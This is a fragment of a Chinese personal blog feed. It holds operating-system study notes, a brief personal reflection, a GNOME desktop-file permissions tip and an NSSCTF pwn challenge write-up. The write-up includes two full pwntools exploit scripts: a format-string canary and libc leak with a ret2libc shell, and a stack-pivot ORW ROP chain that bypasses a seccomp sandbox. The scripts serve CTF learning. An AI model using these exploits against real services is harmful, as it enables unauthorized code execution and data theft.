title="批处理系统"></a>批处理系统</h3><p>优点：</p><ul><li>资源利用率高；</li><li>单位时间内完成的工作总量大；</li></ul><p>缺点：</p><ul><li>无交互手段，不利于调试和修改；</li><li>短作业的周转时间长；</li></ul><h3 id="分时系统"><a href="#分时系统" class="headerlink" title="分时系统"></a>分时系统</h3><p>分时是指将计算机的系统资源（尤其是CPU时间）进行时间上的分割，每个时间段称为一个时间片，每个用户一次轮流使用时间片。</p><p>特点：多路性（又称同时性，多个用户同时工作）、独立性（各用户互不干扰）、及时性（系统能够及时对用户操作响应）、交互性（分时系统基本属性）。</p><h3 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h3><p>细分为硬实时和软实时，分别对应必须在规定的时刻或时间范围完成任务和接受偶尔违反最终时限的情况。在实时计算中，系统的正确性不仅依赖于计算的逻辑结果，还依赖于结果产生的时间。</p><h3 id="以上三类系统的注重点"><a href="#以上三类系统的注重点" class="headerlink" title="以上三类系统的注重点"></a>以上三类系统的注重点</h3><p>分时操作系统设计首要考虑交互性和响应时间；</p><p>批处理操作系统设计首要考虑周转时间和系统吞吐量；</p><p>实时操作系统设计首要考虑实时性和可靠性；</p><h3 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h3><p>以计算机网络为基础，实现了处理和控制的分散，其基本特征是处理上的分布，即功能和任务的分布。</p><p>特点：透明性（资源共享，分布对用户来讲是不知道的）、自治性（处于系统中的多个主机处于平等低位）。</p><p>优点：处理能力增强、速度更快、可靠性增强。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程的特点：动态性、并发性、独立性、异步性、交互性。</p><p>进程 &#x3D; 程序（不可缺少的组成部分）+数据（处理的对象）+PCB（进程控制块，作为进程的控制结构）。</p><p>进程控制块与进程是一一对应的，进程控制块包含了进程描述信息、进程控制信息、资源占用信息、CPU现场保护结构。</p><p>进程的五种基本状态：创建态（刚被创建）、就绪态（获得了除处理机外的所有资源）、运行态（获得处理机运行）、阻塞态（等待某一资源而暂停运行）、终止态（进入该状态以被系统回收相关资源）。</p><h3 id="创建与撤销"><a href="#创建与撤销" class="headerlink" title="创建与撤销"></a>创建与撤销</h3><p>创建、撤销进程以及完成进程各状态之间的转换，由具有特定功能的进程控制原语完成。</p><p><strong>“原语”</strong> 是由若干条机器指令构成、完成一种特定功能的程序段；这段程序在执行期间不允许被分割，必须一次执行完。</p><p>进程创建的基本过程：首先从空闲的 PCB 集合中申请一个新的 PCB，同时获得该进程的内部标识；然后向该 PCB 中填写各种参数；把该进程的状态设置成就绪状态，并将该 PCB 插入到就绪队列中。</p><p>进程撤销的基本过程：</p><ul><li>找到相应进程的 PCB；</li><li>若进程正处于执行状态，则立即停止，设置重新调度标志；</li><li>撤消属于该进程的所有“子孙”进程；</li><li>释放被撤消进程的所有资源；</li><li>释放进程的 PCB；</li><li>若调度标志为真，则进行重新调度。</li></ul><h3 id="阻塞与唤醒"><a href="#阻塞与唤醒" class="headerlink" title="阻塞与唤醒"></a>阻塞与唤醒</h3><p>进程阻塞的基本过程：保护中断现场；置进程的状态为“阻塞态”；将其插入该事件的阻塞队列；转进程调度。<br>进程唤醒的基本过程：在等待队列中找到相应进程的 PCB，将其从等待队列中移出；置其状态为就绪状态，然后把该 PCB 插入就绪队列中；等待调度程序调度。</p><h2 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h2><h3 id="进程同步与互斥"><a href="#进程同步与互斥" class="headerlink" title="进程同步与互斥"></a>进程同步与互斥</h3><h4 id="进程同步与互斥-1"><a href="#进程同步与互斥-1" class="headerlink" title="进程同步与互斥"></a>进程同步与互斥</h4><p>进程同步指系统中一些进程需要相互合作，共同完成一项任务。</p><p>进程互斥是由于各进程要求共享资源，而有些资源需要互斥使用，即多个进程不能同时使用同一个资源，因此各进程间竞争使用这些资源，进程的这种关系为进程的互斥。进程互斥实际上是进程同步的一种特殊情况。</p><p>进程互斥与同步的区别：进程互斥是进程间共享资源的使用权，这种竞争没有固定的必然联系，哪个进程竞争到使用权就归那个进程使用，直到不需要使用时在归还；对进程同步而言，共享资源的并发进程间有一种必然的联系，当进程必须同步时，即使无进程在使用共享资源时，那么尚未得到同步消息的进程也不能去使用这个资源。</p><h4 id="临界资源和临界区"><a href="#临界资源和临界区" class="headerlink" title="临界资源和临界区"></a>临界资源和临界区</h4><p>系统中某些资源一次只允许一个进程使用，这样的资源为临界资源或互斥资源或共享变量。</p><p>根据对临界资源访问的作用，将代码分为四个部分：进入区、临界区、退出区、剩余区。</p><p>由于存在临界资源，因此对临界资源的访问必须进行保护，当一进程访问临界资源时其它进程应处于等待状态。</p><h4 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h4><p>用锁是实现进程互斥的一种常用方法。锁即操作系统中的一个标志位，０表示资源可用，１表示资源已被占用。用户程序不能对锁直接操作，必须通过操作系统提供的上锁和开锁原语来操作。通常锁用 w 表示，上锁开锁原语分别用lock(w)、unlock(w)来表示。</p><h4 id="信号量与PV操作"><a href="#信号量与PV操作" class="headerlink" title="信号量与PV操作"></a>信号量与PV操作</h4><p>信号量机制是一种解决进程的同步与互斥的工具。</p><p>信号量是一个数据结构， 它由两个变量构成: 整型变量 V、指针变量S。初始化指定一个非负整数值，表示空闲资源总数（又称为“资源信号量”），若为非负值表示当前的空闲资源数，若为负值其绝对值表示当前等待临界区的进程数。</p><p>信号量 S 的值只能被 P、V 操作原语进行改变。P(S)表示申请一个资源，V(S)表示释放一个资源。</p><p>操作系统对信号量只能通过初始化和两个标准的原语来访问，对信号量的操作只有三种原子操作：初始化、P操作、V操作。</p><p>P操作会使信号量的值减1（申请一个单位的资源），如果使信号量的值变成负数，则执行 P 操作的进程被阻塞。</p><p>V操作会使信号量的值加1（释放一个单位的资源），如果信号量的值不是正数， 则使一个因执行 v 操作被阻塞的进程解除阻塞。</p><p>P、V 操作必须成对出现，有一个 P 操作就一定有一个 V 操作。当为互斥操作时，它们同处于同一进程；当为同步操作时，则不在同一进程中出现。</p><p>P、V 操作的优缺点：<br>优点：</p><ul><li>简单，而且表达能力强（用 P、V 操作可解决任何同步互斥问题）</li></ul><p>缺点：</p><ul><li>不够安全，P、V 操作使用不当会出现死锁</li><li>遇到复杂同步互斥问题时实现复杂</li></ul><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><p>进程通信是指进程之间可直接以较高的效率传递较多数据的信息交换方式。进程间通信主要分为低级通信和高级通信两类。</p><p>低级通讯只能传递状态和控制信息，优点为速度快，缺点为传送信息小、编程复杂。</p><p>高级通信能够传送任意数量的数据，包括共享存储区、消息系统、管道通信等。</p><h4 id="共享存储区"><a href="#共享存储区" class="headerlink" title="共享存储区"></a>共享存储区</h4><p>共享存储区是指相互通信的进程共享某些数据结构或存储区。一组进程向该公共区中写，另一组进程从公共区中读，又可进一步分为基于共享数据结构的通信方式和基于共享存储区的通信方式。</p><p>基于共享数据结构的通信方式，进程之间能够通过某种类型的数据结构交换信息。操作系统只负责提供共享存储区，共享数据结构和对进程间的同步处理都是程序员的事。因而，通信效率低，只适合于传递少量信息。</p><h4 id="消息系统"><a href="#消息系统" class="headerlink" title="消息系统"></a>消息系统</h4><p>消息系统中进程间的信息交换以消息或报文为单位，程序员利用系统提供的一组通信原语实现通信。操作系统隐藏了通信的实现细节，简化了编程的复杂性。具体又分为直接通信方式和间接通信方式两种。</p><p>直接通信方式（消息缓冲通信），发送进程发消息时要指定接收进程的名字，反过来，接收时要知名发送进程的名字。系统系统两条原语send（receiver， message）和receive（sender， message）。</p><p>间接通信方式，又称为信箱通信。收发双方进程通过某种中间实体，作为通信进程间的媒介，即信箱( MailBox)。发送进程发消息时不指定接收进程的名字，而是指定一个中间媒介。通常收方和发方的数目可以是任意的。这种方式广泛应用于多机系统和<strong>计算机网络</strong>中。系统提供两条原语 send(MB，Message)和 receive(MB，Message)。</p><h4 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h4><p>管道是一条在进程间以字节流方式传送的通信通道，它由操作系统核心的缓冲区来实现，是单向的。在使用管道前要建立相应的管道，然后才可使用。如果进程间需要双向通信，通常需要两个管道。</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>一组进程中，每个进程都无限等待被该组进程中另一进程所占有的资源，因而永远无法得到资源，这种现象称为进程死锁，这一组进程就称为死锁进程。</p><p>死锁的特点：</p><ul><li>参与死锁的进程最少是两个；</li><li>参与死锁的进程至少有两个已经占有资源；</li><li>参与死锁的所有进程都在等待资源；</li><li>参与死锁的进程是当前系统中所有进程的子集。</li></ul><p>产生死锁的原因：</p><ul><li>资源不足导致的资源竞争，多个进程所共享的资源不足，引起它们对资源的竞争而产生死锁；</li><li>并发执行的顺序不当。进程运行过程中，请求和释放资源的顺序不当，而导致进程死锁。例如 P，V 操作的顺序不当。</li></ul><p>发生条件：互斥条件、占有且等待、非抢占条件、循环等待条件。</p><p>处理方法：</p><ul><li>出现死锁后排除：算法检测后进行恢复</li><li>不允许出现死锁：<ul><li>预防死锁：通过限制申请资源的方法来确保至少有一个条件不成立；</li><li>避免死锁：根据有关进程申请资源和使用资源的额外信息，确定对于一个申请，进程是否应该等待。</li></ul></li></ul><p>预防：</p><p>将死锁的四个必要条件记做 C1，C2，C3，C4，死锁记做 D，则有逻辑公式：D→C1^C2^C3^C4。推导可得：<strong>¬</strong>C1∨<strong>¬</strong>C2∨<strong>¬</strong>C3∨<strong>¬</strong>C4→<strong>¬</strong>D。受此启发，预防死锁的具体方法就是破坏产生死锁的四个必要条件之一，此时一定不会出现死锁。</p><p>避免：</p><p>而死锁的避免是不那么严格地限制死锁必要条件的存在，其目的是提高系统的资源利用率。万一当死锁有可能出现时，就小心避免这种情况的发生。安全状态下一定不会发生死锁；不安全状态不一定会发生死锁，只是有很大可能会发生死锁。</p><p>破坏请求和保持条件有以下两种方法：</p><ul><li>要求每个进程在运行前必须一次性申请它所要求的所有资源；</li><li>进程提出申请资源前必须释放已占有的一切资源。</li></ul><p>破坏请求和保持条件的优点是简单、易于实现、安全；缺点是一个进程可能被阻塞很长时间并且资源严重浪费， 进程会延迟运行。</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="内存管理概述"><a href="#内存管理概述" class="headerlink" title="内存管理概述"></a>内存管理概述</h3><p>内存管理是为了充分地利用内存，为多道程序并发执行提供存储基础；尽可能方便用户使用；解决程序空间比实际内存空间大的问题。</p><p>内存管理的功能：</p><ul><li>存储空间的管理、分配和回收</li><li>地址重定位</li><li>存储共享和保护（多个进程共用内存中相同区域）</li><li>存储器扩充</li></ul><p>存储方式：</p><ul><li><p>分区存储：分区存储是将内存分为一些大小相等或不等的分区，每个应用进程占用一个或几个分区，操作系统占用其中一个分区。</p><p>分区存储适用于多道程序系统和分时系统。但是分区存储存在的问题是，可能存在内碎片和外碎片。</p><ul><li>内碎片：占用分区之内未被利用的空间；</li><li>外碎片：占用分区之间难以利用的空闲分区。</li></ul><p>具体的分区方式分为固定分区和动态分区：</p><ul><li>固定分区方式将内存划分为若干个固定大小的连续分区。其优点是易于实现，开销小；缺点是容易有内碎片造成浪费，且分区总数固定，限制了并发执行的程序数目。</li><li>动态分区是在装入程序时按其初始要求分配，或在执行过程中通过系统调用进行分配或改变分区大小。动态分区会存在外碎片。理想状态中，可以随意分配内存的大小，不会造成内碎片，但如果大小不是任意的（存在最小划分的限制），也可能出现内碎片。</li></ul><p>分区分配算法用于寻找某个大于等于程序要求的空闲分区：若是大于要求，就将该分区分割成两个分区，一个分区为要求的大小并标记为“占用”，而另一个分区被标记为“空闲”。分区的先后次序通常是从内存低端到高端。</p><p>分区释放算法用于需要将相邻的空闲分区合并成一个空闲分区。</p></li><li><p>分页存储：分页存储将主存分成多个固定大小的块（称为块或内存块或物理页面），作业按照主存块大小分页，连续的页存放在离散的块中。逻辑上相邻的页，物理上不一定相邻。</p><p>页式存储解决了碎片的问题，便于管理，但增加了处理成本，占用了更多的主存空间。</p><p>页存储将作业分配到物理离散的内存区块中，需要使用逻辑地址来记录每一页的位置，该地址的高位部分为页号，低位部分为页内地址。</p><p>将页号和页内地址转换成内存地址，必须要有一个数据结构，用来登记页号和块的对应关系和有关信息。这样的数据结构称为页表。系统为每个进程建立一个页表，页表的长度和首地址存放在该进程的PCB中。页表需要包含页号、块号和与存储信息保护有关的其他信息。</p></li><li><p>虚拟存储：操作系统统一管理各级存储器，内存中只存放当前要执行的程序部分，其余的保存在外存上。</p><p>特点：不连续、部分交换、虚拟扩充、多次对换。</p></li></ul><h3 id="请求分页存储"><a href="#请求分页存储" class="headerlink" title="请求分页存储"></a>请求分页存储</h3><p>作业运行时，只将当前的一部分装入内存其余的放在辅存，一旦发现访问的页不在主存中，则发出缺页中断，由操作系统将其从辅存调入主存，如果内存无空块，则选择一个页淘汰。分页存储管理系统根据请求装入所需页面的方法称为请求分页存储管理。</p><p>在请求分页时，选择内存中哪个物理页面被置换，就需要使用页面置换算法，其目标是把未来不再使用的或短期内较少使用的页面调出，通常只能在局部性原理指导下依据过去的统计数据进行预测。</p><p>局部性原理：</p><ul><li>时间局部性：如果一个数据正在被访问，那么在近期它很可能还会被再次访问。</li><li>空间局部性：在不久的将来将用到的数据很可能与现在正在使用的数据在空间地址上是临近的。</li></ul><p>页面置换算法：</p><ul><li>先进先出页面算法（FIFO）：选择在内存中驻留时间最长的页并淘汰之；</li><li>最近最久未使用置换算法（LRU）：淘汰没有使用的时间最长的页；</li><li>最佳页面算法（OPT）：淘汰以后不再需要的或最远的将来才会用到的页面；</li><li>最不经常使用（LFU）：选择访问次数最少的页面淘汰之。</li></ul><h2 id="处理机调度"><a href="#处理机调度" class="headerlink" title="处理机调度"></a>处理机调度</h2><h3 id="处理机调度-1"><a href="#处理机调度-1" class="headerlink" title="处理机调度"></a>处理机调度</h3><p>处理机调度的工作是对CPU资源进行合理的分配使用，以提高处理机利用率，并使各用户公平地得到处理机资源。</p><p>处理机调度要解决的核心问题是：</p><ul><li>按什么原则分配CPU（进程调度的算法）；</li><li>何时分配CPU（进程调度的时机）；</li><li>如何分配CPU（进程调度的过程）。</li></ul><p>处理机调度的目标是提高CPU的利用率，提升吞吐量，加快响应时间。</p><p>处理机调度可以分成高级调度、中级调度和低级调度。</p><h3 id="实时调度"><a href="#实时调度" class="headerlink" title="实时调度"></a>实时调度</h3><p>实时调度的分类：</p><ul><li>硬实时任务：必须满足最后期限的限制，否则产生致命的错误；</li><li>软实时任务：希望满足最后期限，但并不是强制的，超过期限，调度完成任务仍有意义；</li><li>非周期任务：有一个必须结束或开始的最后期限；</li><li>周期任务：期限描述为“每隔周期T一次”。</li></ul><p>实现条件：提供必要的信息、实时系统的任务是可调度的、采用抢占式调度机制、具有快速切换机制。</p><p>实时调度算法：</p><ul><li>最早截止期优先（EDF）算法：在每一个新的就绪状态，调度器都是从那些已就绪但还没有完全处理完毕的任务中选择最早截止时间的任务，并将执行该任务所需的资源分配给它。在有新任务到来时，调度器必须立即计算 EDF，排出新的定序，即正在运行的任务被剥夺，并且按照新任务的截止时间决定是否调度该新任务。如果新任务的最后期限早于被中断的当前任务，就立即处理新任务。按照 EDF 算法，被中断任务的处理将在稍后继续进行。</li><li>最低松弛度优先（LLF）算法：根据任务紧急（或松弛）的程度，来确定任务的优先级。松弛度&#x3D;必须完成时间-其本身的运行时间-当前时间。实现该算法时要求系统中有一个按松弛度排序的实时任务就绪队列，松弛度最低的任务排在队列最前面，调度程序总是选择就绪队列中的队首任务执行。</li></ul><h2 id="I-x2F-O设备管理"><a href="#I-x2F-O设备管理" class="headerlink" title="I&#x2F;O设备管理"></a>I&#x2F;O设备管理</h2><h3 id="I-x2F-O设备"><a href="#I-x2F-O设备" class="headerlink" title="I&#x2F;O设备"></a>I&#x2F;O设备</h3><p>I&#x2F;O设备，即计算机的输入输出设备，可以按照交互对象、交互方向、程序使用等不同角度对设备进行分类。</p><p>I&#x2F;O设备的特点：I&#x2F;O性能经常成为系统性能的瓶颈；操作系统庞大复杂，且资源均来自I&#x2F;O；与其他功能联系密切，特别是文件系统；I&#x2F;O设备具有独立性（操作系统把所有外部设备统一当做文件来看待）。</p><p>I&#x2F;O设备管理的目的是为了提高效率、方便使用、方便控制。</p><p>I&#x2F;O设备管理的功能有：</p><ul><li>提供设备使用的用户接口；</li><li>设备分配和释放；</li><li>设备的访问和控制；</li><li>I&#x2F;O缓冲和调度。</li></ul><p>I&#x2F;O系统负责低速的 I&#x2F;O 设备与高速 CPU 以及存储器之间的信息交互，当需要进行数据传输时，I&#x2F;O 系统有如下的控制方式：</p><ul><li>程序直接控制方式：CPU需要不断查询，浪费CPU资源，CPU利用率低；</li><li>I&#x2F;O中断方式：利用效率提高，但是数据缓冲寄存器每满一次都要中断一次，如果设备较多时，中断次数会很多，使 CPU 的计算时间大大减少；</li><li>直接存储器（DMA）方式：DMA 可以直接与内存相连，即 I&#x2F;O 设备可以直接与内存交换数据，不再需要CPU 的中转。CPU 只需要在开始的时候，指定从内存和 I&#x2F;O 设备中的哪些位置进行读写，进一步增加了 CPU 的利用率。DMA 可以一次性读取多个块，但是在内存和 I&#x2F;O 设备中必须是连续的，如果牵扯到读写离散的块，CPU 必须发出多个 I&#x2F;O 指令。</li></ul><p>缓冲技术缓和了CPU与I&#x2F;O设备间速度不匹配的矛盾、减少对CPU的中断频率，放宽对CPU中断响应时间的限制、提高CPU和I&#x2F;O设备之间的并行程度，从而用来匹配CPU 与 I&#x2F;O 设备速度的差异和负荷的不均匀，进而提高处理机与外设的并行程度。</p><p>常用的缓冲方式有：单缓冲、双缓冲、环形缓冲、缓冲池。</p><h3 id="磁盘调度"><a href="#磁盘调度" class="headerlink" title="磁盘调度"></a>磁盘调度</h3><p>几乎所有随机存储的文件都是存放在磁盘上，磁盘I&#x2F;O速度的高低将直接影响文件系统的性能。</p><p>磁盘分为两种：</p><ul><li>固定头磁盘：每个磁道设置一个磁头，变换磁道时不需要磁头的机械移动，速度快但成本高；</li><li>移动头磁盘：一个盘面只有一个磁头，变换磁道时需要移动磁头，速度慢但成本低。</li></ul><p>调度算法：</p><ul><li>先来先服务算法（FCFS）：按访问请求到达的先后次序服务；</li><li>最短寻道时间优先算法（SSTF）：优先选择距当前磁头最近的访问请求进行服务，主要考虑寻道优先；</li><li>扫描算法（电梯算法 SCAN）：设备无访问请求时，磁头不动；当有访问请求时，磁头按一个方向移动，在移动过程中对遇到的访问请求进行服务，然后判断该方向上是否还有访问请求，如果有则继续扫描；否则改变移动方向，并为经过的访问请求服务，如此反复。</li><li>循环扫描调度算法（C-SCAN）：总是从 0 号柱面开始向里扫描。移动臂到达最后一个柱面后，立即带动读写磁头快速返回到 0 号柱面。返回时不为任何的等待访问者服务。返回后可再次进行扫描。</li></ul><p>FCFS SSTF SCAN</p>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Choice|选择</title>
    <link href="/2023/08/03/Choice-%E9%80%89%E6%8B%A9/"/>
    <url>/2023/08/03/Choice-%E9%80%89%E6%8B%A9/</url>
    
    <content type="html"><![CDATA[<p>我们永远在致敬未来</p><p>如果每一件事都在想意义，那么意义就已经不存在了。</p><p>我有我所爱的</p><p>我站着的意义是为了不坐以待毙。我希望呼吸，我在抗争，我在为我的生命喝彩。</p><p>不断凋零，但永远爱。</p><p>找到出口吧！找到真相吧！</p><p>不能变得俗套，不要抱怨。寻找自己的目标，寻找未来的企划。</p>]]></content>
    
    
    <categories>
      
      <category>Outset</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Outset</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#14 Pwn方向专项赛WP</title>
    <link href="/2023/07/30/NSSCTF-Round-14-Pwn%E6%96%B9%E5%90%91%E4%B8%93%E9%A1%B9%E8%B5%9BWP/"/>
    <url>/2023/07/30/NSSCTF-Round-14-Pwn%E6%96%B9%E5%90%91%E4%B8%93%E9%A1%B9%E8%B5%9BWP/</url>
    
    <content type="html"><![CDATA[<h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>看一眼就是非栈上格式化字符串加上栈溢出，修改<code>v4</code>等于<code>v5</code>，然后记录<code>libc_base</code>和<code>canary</code>，新线程获得<code>canary</code>的方法是和主线程的<code>canary</code>相同。</p><p>但是估计猜测原本是想搞TLS结构体，泄露canary可能是非预期解。目前本人还不会TLS求canary的做法，先给出一份利用格式化字符串漏洞泄露canary的做法。</p><p>然后额外先输入一次<code>%p.%p.%p.%p.%p.%p.%p.%p.%p</code>测一下偏移长度，由于<code>v4</code>和<code>v5</code>分别在第一和第二个位置，在输出中可以得到分别在第八和第九个位置。接下来就是<code>canary</code>和<code>__libc_start_main</code>，通过调试与观察，相对位置分别在15和17位。</p><p>那么本题其实就没有什么难点了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>elf = ELF(<span class="hljs-string">&#x27;./p&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>, <span class="hljs-literal">False</span>)<br>ret = <span class="hljs-number">0x4013f3</span><br>rdi = <span class="hljs-number">0x4013f4</span><br>io.sendline(<span class="hljs-string">b&#x27;%8c%9$hhn %15$p %17$p&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>lsm = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;, lsm)</span><br><span class="hljs-comment">#base = lsm - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="hljs-comment">#bsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="hljs-comment">#sys = base + libc.dump(&#x27;system&#x27;)</span><br>base = lsm - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bsh = base + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(rdi)+p64(bsh)+p64(sys))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><p><code>init</code>中返回到了<code>sandbox()</code>，利用<code>seccomp-tools</code>检测dump出来了ban掉小于<code>0x40000000</code>的地址，ban掉非<code>x86_64</code>架构，<code>execve</code>没了，肯定是orw了。</p><p><code>vuln</code>中要输入0x220字节，函数栈中<code>buf+v2</code>一共0x210字节，刚好rbp+ret一共0x10，也有leave ret，肯定栈迁移。然后用vmmap看一下权限，往<code> 0x404000           0x405000 rw-p     1000   3000 /some/place/rbp</code>的bss段写刚好，但是发现没有执行权限，不能写shellcode，所以只能是ROP链，但可执行程序文件本身并没有可用寄存器，那么我们就应该选择提供的libc文件中的寄存器操作。但由于最开始不知道基址，所以需要两次栈迁移，第一次用来泄露<code>libc_base</code>，第二次完成orw。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>elf = ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>, <span class="hljs-literal">False</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>, <span class="hljs-literal">False</span>)<br>vuln = <span class="hljs-number">0x401270</span><br>leave = <span class="hljs-number">0x4012BF</span><br>rdi = <span class="hljs-number">0x401353</span><br>rbp = <span class="hljs-number">0x4012EE</span><br>io.sendafter(<span class="hljs-string">b&#x27;it&#x27;</span>, p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>+p64(<span class="hljs-number">0x404500</span>)+p64(vuln))<br>payload = p64(rdi)+p64(elf.got.read)+p64(elf.plt.puts)+p64(rbp)+p64(<span class="hljs-number">0x404500</span>)+p64(vuln)<br>payload = payload.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x4042e8</span>)+p64(leave)<br><span class="hljs-comment"># 0x500 - 0x220 + 0x8 = 0x2e8</span><br>io.sendafter(<span class="hljs-string">b&#x27;it&#x27;</span>, payload)<br>addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = addr - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>op = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>re = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>wr = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rax = base + <span class="hljs-number">0x36174</span><br>rdi = base + <span class="hljs-number">0x23b6a</span><br>rsi = base + <span class="hljs-number">0x2601f</span><br>rdx = base + <span class="hljs-number">0x142c92</span><br>syscall = base + <span class="hljs-number">0x630a9</span><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(rdi)+p64(<span class="hljs-number">0x4042f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload += p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x404600</span>)+p64(rdx)+p64(<span class="hljs-number">0x100</span>)+p64(re)<br>payload += p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(<span class="hljs-number">0x404600</span>)+p64(rdx)+p64(<span class="hljs-number">0x100</span>)+p64(wr)<br>payload = payload.ljust(<span class="hljs-number">0x210</span>) + p64(<span class="hljs-number">0x4042f0</span>) + p64(leave)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="后面的题还等待后续复现"><a href="#后面的题还等待后续复现" class="headerlink" title="后面的题还等待后续复现"></a>后面的题还等待后续复现</h2>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法</title>
    <link href="/2023/07/03/GNOME%E4%B8%8B%E6%A1%8C%E9%9D%A2.desktop%E6%96%87%E4%BB%B6%EF%BC%88%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%EF%BC%89%E6%97%A0%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <url>/2023/07/03/GNOME%E4%B8%8B%E6%A1%8C%E9%9D%A2.desktop%E6%96%87%E4%BB%B6%EF%BC%88%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%EF%BC%89%E6%97%A0%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>分别在<del>和</del>&#x2F;Desktop下<code>ls -l</code>查看权限，用户组和用户都是本机并且需要.desktop以及Desktop均为权限744即<code>rwxr--r--</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch-Linux-DDE</title>
